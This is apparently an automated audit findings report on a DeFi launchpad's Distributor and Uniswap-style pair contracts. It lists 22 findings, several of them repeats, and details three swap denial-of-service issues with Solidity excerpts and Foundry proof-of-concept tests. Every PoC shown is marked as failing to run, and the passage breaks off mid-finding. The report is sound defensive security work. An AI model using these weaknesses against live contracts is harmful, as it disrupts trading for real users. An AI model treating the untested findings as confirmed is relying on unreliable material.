# 2025 08 gte perps - Findings Report
## Commit hash: f43e1eedb65e7e0327cfaf4d7608a37d85d2fae7

##Findings by Pattern


 **Derived From** : AMM swaps can be permanently DOSed when Distributor.totalShares reaches zero

[M-1]. Uniswap pair swaps revert when rewards pool has zero shares but rewardsPoolActive is still on, DOSing trading
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 6
Privilege: Permissionless
[L-2]. Swap path DoS when rewards pool has zero shares but pair still forwards launchpad fees
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 4
Privilege: Permissionless
[M-3]. GTELaunchpadV2Pair.swap reverts via Distributor.addRewards when reward totalShares is zero, DOSing swaps
Finding Status: Valid
Status Confidence: SomeWhatConfident
Finding Confidence Justification: Launchpad.sol flow is not shown here; if the launchpad always calls endRewards atomically when totalShares reaches zero, the window may not manifest. Given the presented code, the absence of an automatic, enforced linkage makes the issue realistic, but without the full launchpad orchestration code we cannot be fully certain about operational timing.
Finding Complexity: 6
Privilege: Permissionless
[M-4]. Zero-share check in addRewards lets any swap revert via GTELaunchpadV2Pair fee path when no stakers
Finding Status: Valid
Status Confidence: SomeWhatConfident
Finding Confidence Justification: The exploitability window depends on launchpad orchestration and timing (when the pair is created, when shares reach zero, when endRewards is called). The provided code shows no on-chain coupling to prevent the mismatch, but we lack the full Launchpad flow here to prove timing windows exist in all deployments.
Finding Complexity: 4
Privilege: Permissionless



 **Derived From** : Unchecked uint256→uint96 downcasts in reward debts can corrupt accounting at high scales

[L-5]. Unchecked uint256 to uint96 downcast in reward debt can overflow and make claims revert at scale
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 4
Privilege: Permissionless
[L-6]. uint96 rewardDebt downcasts can overflow and then make all future claims revert once rewards are large
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 5
Privilege: Permissionless
[L-7]. Reward debt stored as uint96 without bounds checks can overflow and make claims revert at extreme scales
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 6
Privilege: Permissionless
[L-8]. uint96 rewardDebt truncation makes all future claims revert once rewards exceed 2^96−1
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 4
Privilege: Permissionless



 **Derived From** : Large reward balances can overflow PRECISION math and brick rewards pool

[M-9]. RewardsTrackerLib PRECISION_FACTOR multiplication can overflow and permanently brick a rewards pool
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 3
Privilege: Permissionless



 **Derived From** : Rounding in rewards index vs totalPendingRewards causes permanently locked reward dust

[L-10]. Rounding in rewards indices vs totalPendingRewards permanently locks dust rewards in Distributor
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 3
Privilege: Permissionless
[L-11]. Rounding between RewardsTrackerLib and Distributor.totalPendingRewards permanently locks reward dust
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 5
Privilege: Permissionless
[L-12]. Rounding in RewardsTrackerLib combined with totalPendingRewards prevents withdrawal of accumulated reward dust
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 3
Privilege: Permissionless



 **Derived From** : Accrued launchpad fees mishandled in mint/burn, distorting LP share accounting

[H-13]. Minting LP shares double-counts accrued launchpad fees, inflating attacker share of pool assets
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 6
Privilege: Permissionless



 **Derived From** : Rounding in RewardsTracker permanently locks a portion of deposited rewards

[M-14]. Rounding in RewardsTracker plus totalPendingRewards can permanently lock deposited rewards
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 5
Privilege: Permissionless
[H-15]. Rewards rounding causes part or all of deposited rewards to become permanently unclaimable and unskimmable
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 6
Privilege: Permissionless
[M-16]. Rounding in RewardsTracker and Distributor permanently locks part of reward deposits and makes them unclaimable
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 6
Privilege: Permissionless
[L-17]. Rounding in RewardsTracker + totalPendingRewards causes permanent locked dust that cannot be claimed or skimmed
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 5
Privilege: Permissionless



 **Derived From** : Stake/unstake route user rewards to launchpad (msg.sender) instead of staker

[H-18]. Stake/unstake in Distributor pay accrued rewards to launchpad instead of the staker, silently stealing user yield
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 3
Privilege: RequiresRole
[H-19]. increaseStake/decreaseStake send user rewards to launchpad (msg.sender), zeroing user debt and stealing yield
Finding Status: Valid
Status Confidence: SomeWhatConfident
Finding Confidence Justification: The Launchpad contract code is not included here; it could, by design, forward received rewards to users off-Distributor. However, within the provided Distributor logic, rewards are definitively misdirected during stake updates and accounted as paid, making the issue observable and impactful absent explicit compensating logic elsewhere.
Finding Complexity: 4
Privilege: RequiresRole



 **Derived From** : Launchpad fee accrual breaks Uniswap k-invariant on intra-block swaps

[H-20]. Accrued launchpad fees can be reused as virtual input to drain LP reserves via zero-input swaps
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 7
Privilege: Permissionless



 **Derived From** : In addRewards(token0, token1, amount0, amount1), whichever token is selected as the base asset for the reward pool (the one whose RewardsTrackerStorage.getRewardPool(token).quoteAsset != address(0)) must have its stored quoteAsset equal to the other token argument; i.e., if getRewardPool(token0).quoteAsset != 0, it must equal token1, and if getRewardPool(token0).quoteAsset == 0 and getRewardPool(token1).quoteAsset != 0, then getRewardPool(token1).quoteAsset must equal token0.

[H-21]. Supplying the wrong quote token to Distributor.addRewards bricks quote-reward claiming for the entire pool
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 4
Privilege: Permissionless



 **Derived From** : addRewards allows mismatched quote token, breaking reward accounting and locking tokens

[H-22]. Permissionless addRewards with wrong quote token permanently bricks quote reward claims for a pool
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 4
Privilege: Permissionless


### Number of Findings
- C: 0
- H: 7
- M: 6
- L: 9
- I: 0

##Findings by Pattern


 **Derived From** : AMM swaps can be permanently DOSed when Distributor.totalShares reaches zero

## [M-1]. Uniswap pair swaps revert when rewards pool has zero shares but rewardsPoolActive is still on, DOSing trading

### Finding Severity Justification: Swaps on GTELaunchpadV2Pair can revert whenever the Distributor pool has zero shares while rewardsPoolActive remains enabled. This halts trading for that AMM pair until a privileged actor intervenes, impacting protocol availability but not directly causing asset loss. According to the rubric, sustained DoS of core functionality without capital loss is Medium.
## Derived From Pattern/Invariant
AMM swaps can be permanently DOSed when Distributor.totalShares reaches zero

## Exploit Type
AccountingInvariantViolation

## Location
GTELaunchpadV2Pair.swap / _update / _distributeLaunchpadFees

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 6
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
`GTELaunchpadV2Pair` forwards a portion of swap fees to the `Distributor` on every swap while `rewardsPoolActive > 0`. The `Distributor.addRewards` function, however, reverts with `NoSharesToIncentivize()` if `rs.totalShares == 0` for the target pool. There is no on-chain coupling between `rewardsPoolActive` and `totalShares`, so a misalignment between them causes all swaps that accrue launchpad fees to revert.

In `GTELaunchpadV2Pair.swap`:

```solidity
(uint112 launchpadFee0, uint112 launchpadFee1) = launchpadFeeDistributor > address(0)
    && rewardsPoolActive > 0 ? _getLaunchpadFees(amount0In, amount1In) : (uint112(0), uint112(0));

_update(balance0, balance1, _reserve0, _reserve1, launchpadFee0, launchpadFee1);
```

And in `_update`:

```solidity
if (launchpadFeeDistributor > address(0)) {
    if (totalLaunchpadFee0 | totalLaunchpadFee1 > 0) {
        delete accruedLaunchpadFee0;
        delete accruedLaunchpadFee1;
        _distributeLaunchpadFees(totalLaunchpadFee0, totalLaunchpadFee1);
    }
}
...

function _distributeLaunchpadFees(uint112 fee0, uint112 fee1) internal {
    if ((fee0 | fee1) > 0) {
        address _token0 = token0;
        address _token1 = token1;
        address distributor = launchpadFeeDistributor;

        if (fee0 > 0) _safeApprove(_token0, distributor, uint256(fee0));
        if (fee1 > 0) _safeApprove(_token1, distributor, uint256(fee1));

        IDistributor(distributor).addRewards(_token0, _token1, uint128(fee0), uint128(fee1));
        ...
    }
}
```

In `Distributor.addRewards`:

```solidity
RewardPoolData storage rs = RewardsTrackerStorage.getRewardPool(token0);

if (rs.quoteAsset == address(0)) {
    rs = RewardsTrackerStorage.getRewardPool(token1);

    if (rs.quoteAsset == address(0)) revert RewardsDoNotExist();
    ...
}

if (rs.totalShares == 0) revert NoSharesToIncentivize();
```

`rs.totalShares` tracks the sum of user shares in the corresponding rewards pool. It starts at 0 and can return to 0 if all stakers are fully unstaked via `RewardsTrackerLib.unstake` (called from `Distributor.decreaseStake`), but `GTELaunchpadV2Pair.rewardsPoolActive` is an independent flag that is only cleared when the trusted launchpad calls `endRewardsAccrual()`:

```solidity
function endRewardsAccrual() external {
    if (msg.sender != launchpadFeeDistributor) revert("GTEUniV2: FORBIDDEN");

    delete accruedLaunchpadFee0;
    delete accruedLaunchpadFee1;
    delete rewardsPoolActive;
    ...
}
```

If there is a period where:

* `launchpadFeeDistributor` is set to a non-zero `Distributor` address, and
* `rewardsPoolActive > 0` (default after initialization; only cleared by `endRewardsAccrual()`), and
* the corresponding `RewardPoolData.totalShares == 0` (no active stakers),

then any swap that produces nonzero fees (`amount0In` or `amount1In` large enough such that `_getLaunchpadFees` returns > 0) will reach `_distributeLaunchpadFees` and call `Distributor.addRewards`, which immediately reverts with `NoSharesToIncentivize()`.

Because this revert is inside `_update`, the entire `swap` call reverts. As long as this state persists, **all such swaps are DOSed** for that pair.

This misalignment is realistic:

* At initialization, the launchpad may configure the pair and Distributor before any user shares are created, so `totalShares == 0` while `rewardsPoolActive == 1`.
* Later, if the last staker fully unstakes (via normal launchpad flows that call `decreaseStake`), `totalShares` can return to 0, but the launchpad might not immediately call `endRewardsAccrual`.

In either case, regular users calling `swap` on the pair can encounter persistent reverts unrelated to liquidity or pricing, purely due to the rewards subsystem's internal state.

## Impact
As soon as the rewards pool for a launchpad pair has zero shares while `rewardsPoolActive` remains 1, any swap that generates launchpad fees will revert with `NoSharesToIncentivize()`. This effectively DOSes trading on that AMM pair until a privileged actor calls `endRewardsAccrual()` to clear `rewardsPoolActive`, even though there is sufficient liquidity and the rewards system has no active recipients.

## Command to Run Test


## Proof of Concept
Revised PoC (deterministic and aligned with Uniswap V2 factory expectations):

1) Deploy a MockFactory that implements feeTo() and can deploy-initialize a GTELaunchpadV2Pair so the pair.factory points to a contract with feeTo().
2) Deploy Distributor and initialize it with launchpad = address(this).
3) Deploy two mock ERC20 tokens token0 and token1.
4) From the MockFactory, deploy the pair via new GTELaunchpadV2Pair() and immediately call initialize(token0, token1, launchpadLp=address(this), distributor=address(distributor)).
5) From the launchpad address (this), call distributor.createRewardsPair(token0, token1). At this point rs.totalShares == 0.
6) Seed liquidity: mint 1000e18 token0 and token1 to the test, transfer both to the pair, then call pair.mint(address(this)).
7) vm.warp(block.timestamp + 1) to ensure timeElapsed > 0 in _update so distribution occurs in the next swap.
8) Prepare a swap with nonzero launchpad fee: mint 1000e18 token0 to the test and transfer it to the pair; choose amount1Out = 1e18 to keep the K-check satisfied.
9) Call pair.swap(0, 1e18, address(this), ""). Because rewardsPoolActive == 1 and amount0In > 0, _getLaunchpadFees returns fee0 > 0; _update then calls _distributeLaunchpadFees and Distributor.addRewards(...), which reverts with NoSharesToIncentivize() because rs.totalShares == 0.
10) As long as rewardsPoolActive remains 1 (no call to endRewardsAccrual()) and totalShares == 0, any swap that computes nonzero launchpad fees will revert the same way, DoSing trading for this pair.

## Proof of Code
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import "../contracts/launchpad/Distributor.sol";
import "../contracts/launchpad/uniswap/GTELaunchpadV2Pair.sol";

contract MockERC20 is Test {
    string public name = "Mock";
    string public symbol = "MOCK";
    uint8 public decimals = 18;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        emit Transfer(address(0), to, amount);
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "ALLOWANCE");
        if (allowed != type(uint256).max) {
            allowance[from][msg.sender] = allowed - amount;
        }
        _transfer(from, to, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal {
        require(balanceOf[from] >= amount, "BAL");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
    }
}

// Minimal factory mock so pair._mintFee() can call feeTo() without reverting
contract MockFactory {
    address public feeToAddr;

    function setFeeTo(address a) external { feeToAddr = a; }
    function feeTo() external view returns (address) { return feeToAddr; }

    function deployPair(address token0, address token1, address launchpadLp, address distributor)
        external
        returns (address)
    {
        GTELaunchpadV2Pair p = new GTELaunchpadV2Pair();
        // msg.sender here is MockFactory; pair.factory will be set to this in constructor
        p.initialize(token0, token1, launchpadLp, distributor);
        return address(p);
    }
}

contract PairZeroSharesDosTest is Test {
    Distributor distributor;
    GTELaunchpadV2Pair pair;
    MockERC20 token0;
    MockERC20 token1;
    MockFactory factory;

    address launchpad = address(this);

    function setUp() public {
        // Set up distributor
        distributor = new Distributor();
        distributor.initialize(launchpad);

        // Tokens
        token0 = new MockERC20();
        token1 = new MockERC20();

        // Factory and pair
        factory = new MockFactory();
        address pairAddr = factory.deployPair(address(token0), address(token1), address(this), address(distributor));
        pair = GTELaunchpadV2Pair(pairAddr);

        // Create rewards pool with zero shares
        distributor.createRewardsPair(address(token0), address(token1));

        // Seed initial liquidity
        uint256 liq = 1_000 ether;
        token0.mint(address(this), liq);
        token1.mint(address(this), liq);
        token0.transfer(address(pair), liq);
        token1.transfer(address(pair), liq);
        pair.mint(address(this));

        // Ensure timeElapsed > 0 so distribution path triggers next swap
        vm.warp(block.timestamp + 1);
    }

    function testSwapRevertsWhenNoSharesButRewardsActive() public {
        // Provide token0 in to generate nonzero launchpad fee
        uint256 amountIn = 1_000 ether;
        token0.mint(address(this), amountIn);
        token0.transfer(address(pair), amountIn);

        // Expect revert bubbling from Distributor.addRewards
        vm.expectRevert(Distributor.NoSharesToIncentivize.selector);
        pair.swap(0, 1 ether, address(this), "");
    }
}


## Suggested Mitigation
Two complementary options; either is sufficient alone, using both is ideal:

A) Make Distributor.addRewards robust to zero-share state:
- Replace `revert NoSharesToIncentivize()` with an early return that does NOT mutate pool accounting and does NOT transfer tokens when `rs.totalShares == 0`.
- This guarantees swaps never revert due to rewards state. It also avoids increasing `totalPendingRewards` while no one can claim.

B) Prevent the pair from attempting distribution if the pool has no shares, while preserving accrual:
- Before deleting `accruedLaunchpadFee{0,1}` and calling addRewards in GTELaunchpadV2Pair._update, query the Distributor via a view (e.g., current `getRewardsPoolData(launchAsset)`) to check if `totalShares > 0` for the relevant pool (token0/token1 selection should mirror addRewards’ resolution logic).
- If `totalShares == 0`, do NOT call addRewards and do NOT delete the accrued variables; instead, persist accrual by setting:
  - `accruedLaunchpadFee0 = totalLaunchpadFee0;`
  - `accruedLaunchpadFee1 = totalLaunchpadFee1;`
- Only when `totalShares > 0` should the pair delete the accrued variables and call addRewards with the totals.

Operationally, the launchpad can continue to call endRewardsAccrual() when rewards are intended to stop, but correctness must not depend on perfect off-chain coordination.


## [L-2]. Swap path DoS when rewards pool has zero shares but pair still forwards launchpad fees

### Finding Severity Justification: The issue can DoS swaps on an affected AMM pair by reverting during fee forwarding when the rewards pool has zero shares. However, it causes no asset loss and depends on an admin/launchpad-controlled state (zero shares while rewardsPoolActive remains enabled). This is a governance/operational coupling issue rather than a permissionless exploit that compromises funds.
## Derived From Pattern/Invariant
AMM swaps can be permanently DOSed when Distributor.totalShares reaches zero

## Exploit Type
AccountingInvariantViolation

## Location
Distributor / GTELaunchpadV2Pair.addRewards / swap / _distributeLaunchpadFees

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 4
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
GTELaunchpadV2Pair forwards a share of swap fees to the Distributor via addRewards whenever rewardsPoolActive > 0. Distributor.addRewards, however, reverts with NoSharesToIncentivize() if the targeted reward pool's totalShares == 0. If a pool reaches totalShares == 0 while the pair's rewardsPoolActive flag is still 1, any swap that attempts to accrue launchpad fees will revert, effectively DoSing the AMM for that pair.

Distributor.addRewards:

```solidity
function addRewards(address token0, address token1, uint128 amount0, uint128 amount1) external {
    (address launchAsset, address quoteAsset, uint128 launchAssetAmount, uint128 quoteAssetAmount) =
        (token0, token1, amount0, amount1);
    RewardPoolData storage rs = RewardsTrackerStorage.getRewardPool(token0);

    if (rs.quoteAsset == address(0)) {
        rs = RewardsTrackerStorage.getRewardPool(token1);
        if (rs.quoteAsset == address(0)) revert RewardsDoNotExist();
        (launchAsset, quoteAsset, launchAssetAmount, quoteAssetAmount) = (token1, token0, amount1, amount0);
    }

    if (rs.totalShares == 0) revert NoSharesToIncentivize();
    ... // transfer and accounting
}
```

GTELaunchpadV2Pair.swap and fee forwarding:

```solidity
function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external lock {
    ...
    (uint112 launchpadFee0, uint112 launchpadFee1) = launchpadFeeDistributor > address(0)
        && rewardsPoolActive > 0 ? _getLaunchpadFees(amount0In, amount1In) : (uint112(0), uint112(0));

    _update(balance0, balance1, _reserve0, _reserve1, launchpadFee0, launchpadFee1);
}

function _update(
    uint256 balance0,
    uint256 balance1,
    uint112 _reserve0,
    uint112 _reserve1,
    uint112 newLaunchpadFee0,
    uint112 newLaunchpadFee1
) private {
    ...
    uint112 totalLaunchpadFee0 = accruedLaunchpadFee0 + newLaunchpadFee0;
    uint112 totalLaunchpadFee1 = accruedLaunchpadFee1 + newLaunchpadFee1;
    ...
    if (timeElapsed > 0 && _reserve0 != 0 && _reserve1 != 0) {
        ...
        if (launchpadFeeDistributor > address(0)) {
            if (totalLaunchpadFee0 | totalLaunchpadFee1 > 0) {
                delete accruedLaunchpadFee0;
                delete accruedLaunchpadFee1;
                _distributeLaunchpadFees(totalLaunchpadFee0, totalLaunchpadFee1);
            }
        }
    } else if (launchpadFeeDistributor > address(0) && newLaunchpadFee0 | newLaunchpadFee1 > 0) {
        accruedLaunchpadFee0 = totalLaunchpadFee0;
        accruedLaunchpadFee1 = totalLaunchpadFee1;
        emit LaunchpadFeesAccrued(newLaunchpadFee0, newLaunchpadFee1);
    }
    ...
}

function _distributeLaunchpadFees(uint112 fee0, uint112 fee1) internal {
    if ((fee0 | fee1) > 0) {
        address _token0 = token0;
        address _token1 = token1;
        address distributor = launchpadFeeDistributor;

        if (fee0 > 0) _safeApprove(_token0, distributor, uint256(fee0));
        if (fee1 > 0) _safeApprove(_token1, distributor, uint256(fee1));

        IDistributor(distributor).addRewards(_token0, _token1, uint128(fee0), uint128(fee1));
        ...
    }
}
```

If the reward pool for (token0, token1) exists but has `rs.totalShares == 0` (e.g. all stakers were fully unstaked via Distributor.increaseStake/decreaseStake or equivalent launchpad actions), then the next time `_distributeLaunchpadFees` is triggered, the Distributor call will revert with NoSharesToIncentivize(). This revert bubbles up through _update to swap, causing swap to fail.

Crucially, the pair’s `rewardsPoolActive` flag is managed independently and is only cleared when endRewardsAccrual() is called by the Distributor/launchpad:

```solidity
function endRewardsAccrual() external {
    if (msg.sender != launchpadFeeDistributor) revert("GTEUniV2: FORBIDDEN");

    delete accruedLaunchpadFee0;
    delete accruedLaunchpadFee1;
    delete rewardsPoolActive;
    ...
    emit RewardsPoolDeactivated();
}
```

Nothing in the on-chain logic prevents a state where:
- rs.totalShares == 0 for a pool, but
- launchpadFeeDistributor is set and rewardsPoolActive == 1 on the pair.

In that state, any user calling swap on that pair while swaps generate nonzero launchpadFee0/1 will cause `_distributeLaunchpadFees` -> addRewards -> NoSharesToIncentivize() -> swap revert, effectively DoSing trading on that pair until endRewardsAccrual() is called.

## Impact
If the launchpad or rewards logic reduces a pool’s totalShares to zero without also deactivating rewardsPoolActive on the associated GTELaunchpadV2Pair, then any ordinary swap that tries to accrue launchpad fees will revert. This results in a denial-of-service for AMM trading on that pair, affecting all users, until a privileged actor calls endRewardsAccrual().

## Command to Run Test


## Proof of Concept
Key nuance: _distributeLaunchpadFees is only called when timeElapsed > 0 within _update, or when accruedLaunchpadFee already exists from prior swaps. Therefore, the first swap in a block may only accrue fees (no revert). Any subsequent update in a later block (e.g., next swap or sync) will attempt to forward the accrued fees, hitting Distributor.addRewards and reverting if totalShares == 0.

Revised PoC steps:
1) Deploy a GTELaunchpadV2Pair for (token0, token1) with launchpadFeeDistributor set to Distributor and rewardsPoolActive = 1.
2) In Distributor, createRewardsPair(token0, token1) but do not add any shares (totalShares remains 0).
3) Seed the pair with initial liquidity owned by the launchpad LP address so _getLaunchpadFees yields non-zero fees.
4) Execute a swap in the same block to create nonzero launchpad fees. Because timeElapsed == 0, _update only accrues fees (accruedLaunchpadFee0/1) and does not distribute.
5) Advance the timestamp (timeElapsed > 0) and attempt another swap (or call sync). During _update, the pair attempts _distributeLaunchpadFees with the accrued fees.
6) Distributor.addRewards(...) detects totalShares == 0 and reverts with NoSharesToIncentivize(). The revert bubbles to swap, DoSing swaps until a privileged actor calls endRewardsAccrual().

## Proof of Code
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import "../contracts/launchpad/Distributor.sol";
import "../contracts/launchpad/uniswap/GTELaunchpadV2Pair.sol";
import "../contracts/launchpad/uniswap/interfaces/IUniswapV2Callee.sol";

contract MockERC20 {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    uint8 public decimals = 18;
    uint256 public totalSupply;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    error InsufficientBalance();
    error InsufficientAllowance();

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
        emit Transfer(address(0), to, amount);
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        if (balanceOf[msg.sender] < amount) revert InsufficientBalance();
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        emit Transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        if (balanceOf[from] < amount) revert InsufficientBalance();
        uint256 allowed = allowance[from][msg.sender];
        if (allowed < amount) revert InsufficientAllowance();
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
        return true;
    }
}

contract PairLaunchpadZeroSharesDoSTest is Test, IUniswapV2Callee {
    Distributor dist;
    GTELaunchpadV2Pair pair;
    MockERC20 token0;
    MockERC20 token1;

    address launchpad = address(this); // set this test as launchpad
    address lp = address(0xBEEF01);

    function setUp() public {
        // Deploy tokens
        token0 = new MockERC20();
        token1 = new MockERC20();

        // Deploy Distributor and init
        dist = new Distributor();
        dist.initialize(launchpad);

        // Create rewards pair (keeps totalShares == 0 initially)
        dist.createRewardsPair(address(token0), address(token1));

        // Deploy pair (constructor factory = this test), then initialize
        pair = new GTELaunchpadV2Pair();
        pair.initialize(address(token0), address(token1), lp, address(dist));

        // Seed initial liquidity into pair and mint LP to launchpad LP address
        token0.mint(address(pair), 1_000_000 ether);
        token1.mint(address(pair), 1_000_000 ether);
        pair.mint(lp);

        // Fund this contract with ample token0 to act as swap payer
        token0.mint(address(this), 10_000_000 ether);
    }

    // Standard Uniswap V2 formula to compute amountIn given amountOut (0.3% fee)
    function getAmountIn(uint256 amountOut, uint112 reserveIn, uint112 reserveOut) internal pure returns (uint256) {
        require(amountOut < reserveOut, "bad amountOut");
        uint256 numerator = uint256(reserveIn) * amountOut * 1000;
        uint256 denominator = (uint256(reserveOut) - amountOut) * 997;
        return numerator / denominator + 1;
    }

    function test_Swap_DoS_When_TotalSharesZero() public {
        // 1) First swap in same block to ACCRUE launchpad fees (no distribution/revert)
        (uint112 r0, uint112 r1,) = pair.getReserves();
        uint256 amount1Out1 = 1_000 ether;
        uint256 amount0In1 = getAmountIn(amount1Out1, r0, r1);
        pair.swap(0, amount1Out1, address(this), abi.encode(amount0In1)); // callback will pay token0 in

        // 2) Move time forward to trigger distribution on next _update
        vm.warp(block.timestamp + 1);

        // 3) Second swap attempts to forward ACCRUED + NEW fees -> Distributor reverts (NoSharesToIncentivize)
        (r0, r1,) = pair.getReserves();
        uint256 amount1Out2 = 100 ether;
        uint256 amount0In2 = getAmountIn(amount1Out2, r0, r1);
        vm.expectRevert(Distributor.NoSharesToIncentivize.selector);
        pair.swap(0, amount1Out2, address(this), abi.encode(amount0In2));
    }

    // Uniswap V2 callback: transfer token0 input to pair
    function uniswapV2Call(address /*sender*/, uint256 /*amount0Out*/, uint256 /*amount1Out*/, bytes calldata data) external override {
        require(msg.sender == address(pair), "only pair");
        uint256 amount0In = abi.decode(data, (uint256));
        token0.transfer(address(pair), amount0In);
    }
}


## Suggested Mitigation
Make addRewards tolerant to zero-share pools while preserving AMM reserve consistency:

- Distributor-side fix (preferred): if rs.totalShares == 0, still pull the tokens from the caller (the pair) so that GTELaunchpadV2Pair reserves remain consistent with balances, but do NOT credit rewards state or totalPendingRewards. Treat them as "excess" that can be later recovered via skimExcessRewards(). For example:

  if (rs.totalShares == 0) {
      if (launchAssetAmount > 0) launchAsset.safeTransferFrom(msg.sender, address(this), uint256(launchAssetAmount));
      if (quoteAssetAmount > 0) quoteAsset.safeTransferFrom(msg.sender, address(this), uint256(quoteAssetAmount));
      // Do not call addBaseRewards / addQuoteRewards or _increaseTotalPending here
      return;
  }

  This decouples trading availability from staking state, avoids reverts, and keeps the pair’s reserve math correct when fees are siphoned from the pool.

- Additionally (optional), expose a lightweight view (e.g., hasActiveShares(launchAsset) -> bool) so the pair can skip approvals and external calls when there are no shares. This is a gas optimization, not a correctness requirement.

- Operationally, keep endRewardsAccrual() invocation in the launchpad flow when unbonding to zero shares, but do not rely on it for safety.


## [M-3]. GTELaunchpadV2Pair.swap reverts via Distributor.addRewards when reward totalShares is zero, DOSing swaps

### Finding Severity Justification: The bug allows a permissionless Denial-of-Service of the AMM pair’s swap function: when the Distributor’s reward pool totalShares reaches zero but the pair’s rewardsPoolActive remains enabled, any swap that accrues launchpad fees will revert via Distributor.addRewards(). This halts trading on that pair until a privileged endRewards call is made. No direct asset loss occurs, but protocol availability for the affected market is impacted.
## Derived From Pattern/Invariant
AMM swaps can be permanently DOSed when Distributor.totalShares reaches zero

## Exploit Type
AccountingInvariantViolation

## Location
GTELaunchpadV2Pair.swap

## Finding Status: Valid
## Status Confidence: SomeWhatConfident
### Finding Confidence Justification: Launchpad.sol flow is not shown here; if the launchpad always calls endRewards atomically when totalShares reaches zero, the window may not manifest. Given the presented code, the absence of an automatic, enforced linkage makes the issue realistic, but without the full launchpad orchestration code we cannot be fully certain about operational timing.
### Finding Complexity: 6
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
GTELaunchpadV2Pair routes a portion of swap fees to the Distributor via addRewards(), but Distributor.addRewards() reverts whenever rs.totalShares == 0 for the relevant reward pool. There is no on-chain coupling between the pool’s totalShares and GTELaunchpadV2Pair.rewardsPoolActive, so once all staking shares are removed but rewardsPoolActive remains 1, any swap that accrues launchpad fees will revert.

Relevant code in Distributor:

    function addRewards(address token0, address token1, uint128 amount0, uint128 amount1) external {
        ...
        RewardPoolData storage rs = RewardsTrackerStorage.getRewardPool(token0);
        if (rs.quoteAsset == address(0)) { ... }
        if (rs.totalShares == 0) revert NoSharesToIncentivize();
        ...
    }

In GTELaunchpadV2Pair.swap():

    (uint112 launchpadFee0, uint112 launchpadFee1) = launchpadFeeDistributor > address(0)
        && rewardsPoolActive > 0 ? _getLaunchpadFees(amount0In, amount1In) : (0, 0);
    _update(balance0, balance1, _reserve0, _reserve1, launchpadFee0, launchpadFee1);

_update() distributes fees to the Distributor whenever timeElapsed > 0 and there are non-zero accrued fees:

    if (timeElapsed > 0 && _reserve0 != 0 && _reserve1 != 0) {
        ...
        if (launchpadFeeDistributor > address(0)) {
            if (totalLaunchpadFee0 | totalLaunchpadFee1 > 0) {
                delete accruedLaunchpadFee0;
                delete accruedLaunchpadFee1;
                _distributeLaunchpadFees(totalLaunchpadFee0, totalLaunchpadFee1);
            }
        }
    }

    function _distributeLaunchpadFees(uint112 fee0, uint112 fee1) internal {
        if ((fee0 | fee1) > 0) {
            address distributor = launchpadFeeDistributor;
            ...
            IDistributor(distributor).addRewards(_token0, _token1, uint128(fee0), uint128(fee1));
        }
    }

If the rewards pool for (token0, token1) exists but rs.totalShares has dropped to zero (all stakers exited), any call to addRewards() from _distributeLaunchpadFees() will revert with NoSharesToIncentivize(). Because this is executed inside swap(), the entire swap reverts. There is no automatic deactivation of rewardsPoolActive when totalShares hits zero; rewardsPoolActive is only set to 0 by GTELaunchpadV2Pair.endRewardsAccrual(), which can only be called via Distributor.endRewards(), which itself is only callable by the launchpad contract.

Therefore, there is a realistic window where:
- All user shares have been removed (rs.totalShares == 0), but
- rewardsPoolActive is still 1 (endRewardsAccrual() has not yet been called), and
- Any user attempting to swap through the pair will cause swap() to revert once launchpad fees are positive.

## Impact
